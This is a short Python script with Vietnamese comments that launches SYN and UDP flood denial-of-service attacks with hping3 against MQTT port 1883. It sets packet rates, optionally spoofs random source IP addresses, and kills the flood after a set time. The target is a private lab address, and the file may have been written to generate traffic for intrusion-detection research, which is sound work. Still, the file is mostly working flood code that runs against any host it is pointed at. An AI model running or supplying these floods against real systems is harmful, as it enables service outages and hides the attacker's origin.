import subprocess
import time

# Chuyển đổi Rate (Gói tin/giây) sang tham số khoảng thời gian (Microgiây) của hping3
RATES = {
    'syn_flood': {1000: 'u1000', 5000: 'u200', 20000: 'u50'},
    'udp_flood': {2000: 'u500', 5000: 'u200', 12000: 'u83'}
}

def launch_attack(attack_type, rate, duration, spoof=False, target_ip="10.0.30.10"):
    """
    Hàm kích hoạt cuộc tấn công DDoS vào hệ thống
    """
    if attack_type not in RATES or rate not in RATES[attack_type]:
        print(f"Lỗi: Mức tấn công {rate} pps cho {attack_type} không hợp lệ!")
        return

    interval = RATES[attack_type][rate]
    spoof_flag = "--rand-source" if spoof else "" # Chế độ giả mạo IP nguồn
    
    if "syn" in attack_type:
        # Bắn SYN Flood vào cổng MQTT 1883
        cmd = f"hping3 -S -p 1883 -i {interval} {spoof_flag} {target_ip}"
    else:
        # Bắn UDP Flood (Gói tin 1066 byte làm nghẽn băng thông)
        cmd = f"hping3 --udp -p 1883 -d 1066 -i {interval} {spoof_flag} {target_ip}"

    print(f"[!] HACKER TẤN CÔNG: {attack_type.upper()} | {rate} pps | {duration} giây | Giả mạo IP: {spoof}")
    
    try:
        # Chạy ngầm tiến trình bắn phá
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        proc.terminate()
        # Dọn dẹp triệt để tiến trình hping3
        subprocess.run("pkill -9 hping3", shell=True, stderr=subprocess.DEVNULL)
        print("[*] Đã kết thúc đợt tấn công.")
    except Exception as e:
        print(f"Lỗi hệ thống tấn công: {e}")

if __name__ == "__main__":
    # Test thử 5 giây SYN Flood (bị vô hiệu hóa mặc định để an toàn)
    pass